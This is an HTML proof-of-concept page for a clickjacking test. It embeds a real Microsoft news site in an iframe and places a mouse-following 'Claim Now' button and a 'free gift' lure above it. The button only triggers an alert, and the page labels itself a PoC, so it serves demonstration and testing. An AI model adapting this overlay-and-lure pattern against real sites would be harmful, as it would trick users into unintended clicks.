<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ClikJak PoC - Clickjacking Test</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
            background: #f8f8f8;
            overflow: hidden;
        }

        h1 {
            font-size: 28px;
            color: red;
            margin-top: 20px;
            animation: glitch 1s infinite;
        }

        p {
            font-size: 18px;
        }

        iframe {
            width: 100%;
            height: 600px;
            border: none;
            position: relative;
            z-index: 10;
            opacity: 1;
        }

        /* Glitchy animated warning */
        @keyframes glitch {
            0% { text-shadow: 2px 2px red; }
            50% { text-shadow: -2px -2px yellow; }
            100% { text-shadow: 2px 2px red; }
        }

        /* Transparent overlay */
        .overlay {
            position: absolute;
            top: 150px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(255, 0, 0, 0.2);
            padding: 10px;
            font-size: 22px;
            font-weight: bold;
            color: white;
            z-index: 50;
            border-radius: 10px;
            animation: fadeIn 2s ease-in-out;
        }

        /* Hidden click button */
        .hidden-click {
            position: absolute;
            top: 300px;
            left: 50%;
            transform: translateX(-50%);
            background: red;
            color: white;
            font-size: 24px;
            padding: 15px;
            cursor: pointer;
            border: none;
            z-index: 100;
            border-radius: 8px;
            box-shadow: 0px 0px 10px rgba(255, 0, 0, 0.8);
            transition: all 0.2s ease-in-out;
        }

        /* Mouse hover animation */
        .hidden-click:hover {
            background: darkred;
            box-shadow: 0px 0px 20px rgba(255, 0, 0, 1);
            transform: scale(1.1) translateX(-50%);
        }

        /* Floating effect */
        .floating {
            animation: float 1.5s infinite alternate ease-in-out;
        }

        @keyframes float {
            0% { transform: translate(-50%, 0); }
            100% { transform: translate(-50%, 10px); }
        }

        /* Smooth fade-in */
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
    <script>
        function clicked() {
            alert("Button clicked! Imagine if this were a real action inside the iframe...");
        }

        // Mouse-tracking fake button
        document.addEventListener("mousemove", (event) => {
            let button = document.querySelector(".hidden-click");
            let offsetX = (Math.random() * 10) - 5;
            let offsetY = (Math.random() * 10) - 5;
            button.style.top = `${event.clientY + offsetY}px`;
            button.style.left = `${event.clientX + offsetX}px`;
        });
    </script>
</head>
<body>
    <h1>ðŸš¨ Special Offer: Click Below to Get a Free Gift! ðŸš¨</h1>
    
    <div class="overlay">âš  Warning: This is an interactive PoC âš </div>

    <button class="hidden-click floating" onclick="clicked()">Claim Now</button>

    <p>This response was modified dynamically.</p>

    <!-- Target Microsoft page inside an iframe -->
    <iframe src="https://news.microsoft.com" id="target-frame"></iframe>
</body>
</html>
